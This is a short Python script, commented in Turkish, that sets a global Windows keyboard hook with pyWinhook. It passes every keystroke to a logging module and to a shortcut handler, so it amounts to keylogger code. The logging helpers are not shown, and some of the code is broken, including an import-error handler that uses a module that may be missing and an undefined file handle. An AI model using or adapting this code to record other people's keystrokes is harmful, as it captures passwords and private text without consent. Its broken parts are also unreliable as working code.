#!/usr/bin/python
# -*- coding: utf-8 -*-

######################################################
#      PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA      
######################################################

try:
    import pyWinhook, pygame, atexit
    from utils import yLogger, yShortcutHandler, yDebugger
except ImportError as ext:
    import os

    path = pyWinhook.__file__
    dllpath = os.path.join(path, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(f" DLL dosyaları koypalanmalı!")
    print()
    print(f"     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print(f"     Kopyalanacağı dizin:")
    print(f"         C:\Windows\System32")

    quit()

KEY_LIMIT = 1

def OnKeyboardEvent(event):
    yShortcutHandler.handleShortcutPressed(event)
    yLogger.regData(event)
    yLogger.logOnReach(KEY_LIMIT)

    return True

def onexit():
    try:
        CONTEXT_FILE.close()
    except:
        pass

def pumpMessage():
    pygame.init()
    while True:
        pygame.event.pump()

atexit.register(onexit) # TODO: Bunu nasıl aktif kılarım bilmiyorum

yDebugger.setLogLvl(2)
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pumpMessage()
